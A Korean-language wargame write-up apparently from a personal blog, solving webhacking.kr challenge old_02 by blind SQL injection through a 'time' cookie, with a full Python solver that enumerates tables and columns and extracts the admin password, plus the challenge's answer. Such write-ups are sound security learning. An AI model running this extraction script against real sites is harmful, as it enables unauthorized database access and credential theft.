---
title: "webhacking.kr old 02 문제 풀이"
date: 2025-02-18 00:00:00 +0800
categories: [Wargame, Webhacking.kr]
tags: [cyber security, writeup, webhackingkr, web hacking, blind sql injection] 
description: webhacking.kr old 02 문제 풀이
---

# 살펴보기
![old_02 main page](https://1drv.ms/i/c/5cb37aa515b56a00/IQR-V_QtWJ2NQYXzGeLR1PP3AVELzu-FX8UBwUSoFQGvROQ?width=660)<br />
![old_02 inspect window](https://1drv.ms/i/c/5cb37aa515b56a00/IQR40isTS7M3Rrb0E2V9SFtJAQPQIs_Gqommoy_RobUKlu8?width=660)<br />
이번에는 각종 웹해킹 워게임들을 풀어볼 수 있는 webhacking.kr의 old_02라는 문제를 풀어보았다.

메인 페이지에 접속하면 해당 사진의 정보가 뜨는데 이 상황 만으로는 딱히 할 수 있는게 없으므로 개발자 도구를 살펴봤다.
html을 살펴보면 맨 위에 현재 시각이 주석처리 된 것이 보이고 그 아래에는 *"if you access admin.php i will kick your ass"* 라는 무시무시한 경고가 보인다. admin.php에 접속하면 엉덩이를 걷어차버릴 거라는 경고이다.

# admin.php 접속
여기서 힌트를 얻을 수 있다. admin.php에 접속을 해야한다. <br />
처음에 왜 헷갈렸는지 모르겠으나 어떻게 admin.php에 접속을 해야할까 고민을 하던 중, 그냥 URL의 file path 부분에 admin.php를 넣어보니 접속이 됐다. [https://webhacking.kr/challenge/web-02/admin.php](https://webhacking.kr/challenge/web-02/admin.php) <br />
해당 서버의 특정 파일에 접속하려면 이 방법뿐이 거의 유일무이한데 여기서 꽤나 오랜시간 삽질을 해버렸다.<br />
![old_02 admin.php](https://1drv.ms/i/c/5cb37aa515b56a00/IQSd9saWf4AeQJfYZnmg6PGwAc4IbIfZtJPpDqZBFPck4R4?width=660)<br />
해당 php에 접속을 하게 되면 비밀번호를 입력할 수 있는 form 하나가 등장한다. 여기에 적절한 비밀번호를 입력해야 문제가 풀리는 방식인 것 같다. 하지만 비밀번호가 뭔지 도통 감이 잡히질 않는다.

## 시도해본 여러가지 방식들
1. 메인 페이지에서 "Your IP is logging..."이라고 뜬 것을 보고 설마 내 IP가 비밀번호인가 싶어 넣어보기도 했다.
2. 현재 브라우저의 쿠키를 살펴보면 time이라는 새로운 쿠키가 등록된 것이 보인다. 혹시 여기에 내 IP 주소를 넣으면 될까 싶었는데 그것 역시 안된다. 
3. 아니면 메인 html에 주석처리된 맨 위의 날짜를 time에 넣어봐야할까 해서 넣어보니 이 방법도 먹통이다.

# 해결 방식
## 쿠키 time 알아보기
어떻게 해야할까 고민하면서 time에 여러 값을 넣어보니(time이 유일한 해결법인 것 같아서) 숫자를 넣을때마다 주석처리된 날짜의 값이 조금씩 변하는게 보인다.<br />
특히 어떠한 패턴이 보이기 시작하는데 time에 넣은 값에 따라서 날짜의 값이 빠지거나 더해진다. <br />
- time이 -1일 때, 날짜는 2070-01-01 08:59:59
- time이 1일 때, 날짜는 2070-01-01 09:00:01
- time이 2일 때, 날짜는 2070-01-01 09:00:02
- time이 100일 때, 날짜는 2070-01-01 09:01:40 (100초는 1분 40초)

이것만 봐서는 time의 성질로 대체 뭘 할 수 있을까 싶지만 혹시나해서 그냥 time에 쿼리 문이 작동하는지 입력해보았다. <br />
time이 (select 5)를 입력했을 때 ```<!-- 2070-01-01 09:00:05 --> ``` 주석의 날짜가 5초 증가했다. 이로써 쿼리 문의 결과 값이 날짜에 반영되는 방식으로 작동한다는 것을 알 수 있다.
## Blind SQL Injection
이런 상황에서 사용할 수 있는 방식이 **Blind SQL Injection**이다. 쿼리의 결과값이 날짜에 조금씩 반영되는 방식이라 한 번에 어떠한 값을 얻어낼 수 없는 상황이고, 어느 테이블에서 값을 빼와야하는지 확실하지 않은 상황이라 blind 방식을 이용해 하나하나 값을 얻어가야 한다.

여기서 얻어야 하는 값의 순서는 다음과 같다.
1. 테이블 개수
2. 비밀번호가 담긴 테이블 이름
3. 해당 테이블 내부의 컬럼 개수
4. 비밀번호를 담고있을 만한 컬럼 이름
5. 해당 컬럼에서 비밀번호 가져오기
### 테이블 개수 구하는 함수

```python
import requests
from datetime import datetime

class Solver:
    """Solver for webhacking.kr old_02"""
    def __init__(self) -> None:
        self.url = "https://webhacking.kr/challenge/web-02"

    def _query_time(self, query) -> int:
        resp = requests.get(self.url, cookies={"time": f"{query}"})
        html_text = resp.text

        start = html_text.find("<!--") + 4  # Move past the "<!--"
        end = html_text.find("-->")

        time_part = html_text[start:end].strip().split()[1]

        # Convert to a datetime object
        time_obj = datetime.strptime(time_part, "%H:%M:%S")
        
        # Calculate seconds past 09:00:00
        base_time = datetime.strptime("09:00:00", "%H:%M:%S")
        seconds_difference = (time_obj - base_time).seconds
        
        return int(seconds_difference)
    
    def _get_table_count(self) -> int:
        query = "(SELECT COUNT(table_name) FROM information_schema.tables where table_schema = database())"
        return self._query_time(query)

    def solve(self) -> None:
        table_count = self._get_table_count()
        print("Number of Tables:", table_count)

if __name__ == "__main__":
    solver = Solver()
    solver.solve()
```
`_query_time()`함수로 특정 쿼리를 담은 쿠키와 함께 GET 요청해서 HTML 값을 받아오는 원리이다. 특정 쿼리 값은 `_query_time()`을 호출할 때 인자로 넘겨준다.<br />

```
❯ /usr/local/bin/python3 /Users/hoonyim/Desktop/HACKs/WEB/webhacking.kr/old_2.py
Number of Tables: 2
```
코드를 실행하면 위와 같은 결과가 나온다. 즉, 테이블의 개수는 2개이다.
### 비밀번호가 담긴 테이블의 이름 구하는 함수
#### 테이블 이름의 길이 구하기
```python
def _get_table_name_len(self, table_count: int) -> list[int]:
arr = []
	for i in range(0, table_count):
		query = f"(SELECT LENGTH(table_name) from information_schema.tables where table_schema=database() limit {i}, 1)"
		arr.append(self._query_time(query))
	return arr
	
def solve(self) -> None:
	table_count = self._get_table_count()
	table_names_len = self._get_table_name_len(table_count)
	print("Number of Tables:", table_count)
	print("Length of Each Tables:", table_names_len)
```

```
# result
Number of Tables: 2
Length of Each Tables: [13, 3]
```

이번에는 전에 알아냈던 테이블 개수를 이용해서 각 테이블 이름의 길이를 알아내는 함수를 작성했다. 이를 적용해 코드를 돌리면 각 테이블 이름의 길이가 13과 3이라는 것을 알 수 있게 된다.<br />
해당 함수에서 for문으로 테이블 개수만큼 반복해주고 `limit {i}, 1`를 이용해서 길이를 받게되는 원리이다.
#### 테이블 이름 구하기
```python
def _get_table_names(self, lens: list[int]) -> list[str]:
	arr = []
	for i in range(len(lens)):
		temp_name = ""
		for j in range(1, lens[i] + 1):
			query = f"(SELECT ascii(substr(table_name, {j}, 1)) from information_schema.tables where table_schema=database() limit {i}, 1)"
			temp_name += chr(self._query_time(query))
		arr.append(temp_name)

	return arr


def solve(self) -> None:
	table_count = self._get_table_count()
	print("Number of Tables:", table_count)

	table_names_len = self._get_table_name_len(table_count)
	print("Length of Each Tables:", table_names_len)

	table_names = self._get_table_names(table_names_len)
	print("Names of Each Tables:", table_names)
```

```
# result
Number of Tables: 2
Length of Each Tables: [13, 3]
Names of Each Tables: ['admin_area_pw', 'log']
```

이번 함수는 이 전에 알아낸 정보 (테이블이 총 2개라는 것과 각 테이블의 길이가 13과 3이라는 것)을 이용해서 테이블의 실제 이름이 무엇인지 알아내는 역할을 한다.
코드의 결과를 보면 `'admin_area_pw'`이 있는 것을 알 수 있는데 아마도 이 테이블에 있는 값을 확인해보면 admin의 비밀번호가 무엇인지 알아낼 수 있을 것 같은 강력한 느낌이 든다.
### 테이블에 들어있는 정보를 구하는 함수
#### 테이블의 컬럼 수 구하기
```python
def _get_column_count(self, table_name: str) -> int:
	query = f'(SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name="{table_name}")'
	return self._query_time(query)

def solve(self) -> None:
	table_count = self._get_table_count()
	print("Number of Tables:", table_count)

	table_names_len = self._get_table_name_len(table_count)
	print("Length of Each Tables:", table_names_len)

	table_names = self._get_table_names(table_names_len)
	print("Names of Each Tables:", table_names)

	column_count = self._get_column_count(table_names[0])
	print("Number of Columns of 'admin_area_pw':", column_count)
```

```
# result
Number of Tables: 2
Length of Each Tables: [13, 3]
Names of Each Tables: ['admin_area_pw', 'log']
Number of Columns of 'admin_area_pw': 1
```
테이블에 들어있는 값을 Blind SQL 인젝션 기법으로 알아내려면 우선 해당 테이블이 컬럼을 몇개나 가지고 있는지 알아내야 한다.<br />
이번 함수는 특별한 것 없이 단순히 테이블 'admin_area_pw'에 들어있는 column의 개수를 가져오는 함수이다.<br />

결과를 보면 컬럼 개수가 단 하나 뿐이란 것을 알 수 있다. <br />
다음으로 이 하나의 컬럼이 어떤 이름을 가지고 있는지 알아내야 하는데 한 개라서 추가적인 반복없이 편하게 구할 수 있어서 다행이다.
#### 컬럼의 이름 구하기
```python
def _get_column_name(self, table_name: str) -> str:
	query = f'(SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name="{table_name}")'
	column_count = self._query_time(query)

	query = f'(SELECT Length(column_name) FROM information_schema.columns WHERE table_name="{table_name}")'
	column_length = self._query_time(query)

	column_name = ""
	for i in range(1, column_length + 1):
		query = f'(SELECT ascii(substr(column_name, {i}, 1)) FROM information_schema.columns WHERE table_name="{table_name}")'
		column_name += chr(self._query_time(query))
	
	return column_name
	
def solve(self) -> None:
	table_count = self._get_table_count()
	print("Number of Tables:", table_count)

	table_names_len = self._get_table_name_len(table_count)
	print("Length of Each Tables:", table_names_len)

	table_names = self._get_table_names(table_names_len)
	print("Names of Each Tables:", table_names)

	column_name = self._get_column_name(table_names[0])
	print("Name of a column in 'admin_area_pw':", column_name)
```

```
# result
Number of Tables: 2
Length of Each Tables: [13, 3]
Names of Each Tables: ['admin_area_pw', 'log']
Name of a column in 'admin_area_pw': pw
```
어차피 column의 개수가 1개이기도 하고 따로 함수를 둘 필요는 없을 것 같아서 바로 직전에 구현했던 `_get_column_count()`함수를 없애버리고 `_get_column_name()`함수에 통합시켜버렸다. <br />
결과 값을 보면 `admin_area_pw`이 가지고 있는 컬럼 한 개의 이름은 `'pw'`이다.
### 비밀번호 가져오기
이제 테이블 이름과 컬럼 이름을 모두 다 알아냈다. 마지막으로 남은 일은 해당 테이블과 컬럼에서 진짜로 들어있는 비밀번호의 값을 알아내면 된다.<br />
원래였다면 그냥 `SELECT pw FROM admin_area_pw`로 곧바로 얻을 수 있겠지만, 그럴 수 있는 상황이 아니기 때문에 우리는 다시 한 번 노가다를 대신해줄 코드를 작성해줘야 한다.

```python
def _get_password(self, table_name: str, column_name: str) -> str:
	query = f'(SELECT length({column_name}) FROM {table_name})'
	password_len = self._query_time(query)

	password = ""
	for i in range(1, password_len + 1):
		query = f'(SELECT ascii(substr({column_name}, {i}, 1)) FROM {table_name})'
		password += chr(self._query_time(query))

	return password
	
def solve(self) -> None:
	table_count = self._get_table_count()
	print("Number of Tables:", table_count)

	table_names_len = self._get_table_name_len(table_count)
	print("Length of Each Tables:", table_names_len)

	table_names = self._get_table_names(table_names_len)
	print("Names of Each Tables:", table_names)

	column_name = self._get_column_name(table_names[0])
	print("Name of a column in 'admin_area_pw':", column_name)

	password = self._get_password(table_names[0], column_name)
	print("PASSWORD:", password)
```

```
# result
Number of Tables: 2
Length of Each Tables: [13, 3]
Names of Each Tables: ['admin_area_pw', 'log']
Name of a column in 'admin_area_pw': pw
PASSWORD: kudos_to_beistlab
```
비밀번호의 길이를 우선 length(pw) sql 연산자로 얻고 길이만큼 반복해주어 실제 값을 얻는 코드이다.<br />
결과를 보면 맨 마지막 줄에 실제 admin의 비밀번호가 출력된 것을 볼 수 있다.

![old_02 solved](https://1drv.ms/i/c/5cb37aa515b56a00/IQRtRRWeOofgTJBPAfBNuwV3AU2NsQkiKsUkBTCeBe9d3zg?width=660)
<br />
이제 이 비밀번호를 /admin.php에 접속하여 input 박스에 넣어 제출해주면 해당 화면이 뜨면서 문제가 해결되게 된다.

Blind SQL Injection 연습문제로 참 좋다고 생각이 든다.
최종 코드는 아래에 있다.
## 최종 코드
```python
import requests
from datetime import datetime

class Solver:
    """Solver for webhacking.kr old_02"""
    def __init__(self) -> None:
        self.url = "https://webhacking.kr/challenge/web-02"

    def _query_time(self, query) -> int:
        resp = requests.get(self.url, cookies={"time": f"{query}"})
        html_text = resp.text

        start = html_text.find("<!--") + 4  # Move past the "<!--"
        end = html_text.find("-->")

        time_part = html_text[start:end].strip().split()[1]

        # Convert to a datetime object
        time_obj = datetime.strptime(time_part, "%H:%M:%S")
        
        # Calculate seconds past 09:00:00
        base_time = datetime.strptime("09:00:00", "%H:%M:%S")
        seconds_difference = (time_obj - base_time).seconds
        
        return int(seconds_difference)
    
    def _get_table_count(self) -> int:
        query = "(SELECT COUNT(table_name) FROM information_schema.tables where table_schema = database())"
        return self._query_time(query)

    def _get_table_name_len(self, table_count: int) -> list[int]:
        arr = []
        for i in range(0, table_count):
            query = f"(SELECT LENGTH(table_name) from information_schema.tables where table_schema=database() limit {i}, 1)"
            arr.append(self._query_time(query))
        return arr

    def _get_table_names(self, lens: list[int]) -> list[str]:
        arr = []
        for i in range(len(lens)):
            temp_name = ""
            for j in range(1, lens[i] + 1):
                query = f"(SELECT ascii(substr(table_name, {j}, 1)) from information_schema.tables where table_schema=database() limit {i}, 1)"
                temp_name += chr(self._query_time(query))
            arr.append(temp_name)

        return arr

    def _get_column_name(self, table_name: str) -> str:
        query = f'(SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name="{table_name}")'
        column_count = self._query_time(query)

        query = f'(SELECT Length(column_name) FROM information_schema.columns WHERE table_name="{table_name}")'
        column_length = self._query_time(query)

        column_name = ""
        for i in range(1, column_length + 1):
            query = f'(SELECT ascii(substr(column_name, {i}, 1)) FROM information_schema.columns WHERE table_name="{table_name}")'
            column_name += chr(self._query_time(query))
        
        return column_name

    def _get_password(self, table_name: str, column_name: str) -> str:
        query = f'(SELECT length({column_name}) FROM {table_name})'
        password_len = self._query_time(query)

        password = ""
        for i in range(1, password_len + 1):
            query = f'(SELECT ascii(substr({column_name}, {i}, 1)) FROM {table_name})'
            password += chr(self._query_time(query))

        return password
        
    def solve(self) -> None:
        table_count = self._get_table_count()
        print("Number of Tables:", table_count)

        table_names_len = self._get_table_name_len(table_count)
        print("Length of Each Tables:", table_names_len)

        table_names = self._get_table_names(table_names_len)
        print("Names of Each Tables:", table_names)

        column_name = self._get_column_name(table_names[0])
        print("Name of a column in 'admin_area_pw':", column_name)

        password = self._get_password(table_names[0], column_name)
        print("PASSWORD:", password)

if __name__ == "__main__":
    solver = Solver()
    solver.solve()
```